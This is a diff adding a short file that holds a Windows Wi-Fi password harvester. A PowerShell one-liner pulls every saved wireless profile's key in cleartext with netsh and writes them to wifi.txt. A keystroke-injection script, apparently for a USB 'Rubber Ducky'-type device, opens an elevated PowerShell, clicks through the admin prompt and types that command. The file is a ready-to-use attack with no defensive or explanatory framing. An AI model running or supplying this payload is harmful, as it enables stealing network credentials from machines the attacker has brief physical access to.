@@ -1,0 +1,21 @@
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> $env:userprofile\wifi.txt
+start notepad.exe $env:userprofile\wifi.txt ; exit
+
+------------------------------------------------------------------------------------------------------------------
+
+DELAY 1500
+GUI r
+DELAY 1000
+STRING Powershell
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 800
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> $env:userprofile\wifi.txt
+DELAY 500
+ENTER
+DELAY 1500
+STRING start notepad.exe $env:userprofile\wifi.txt ; exit
+DELAY 500
+ENTER
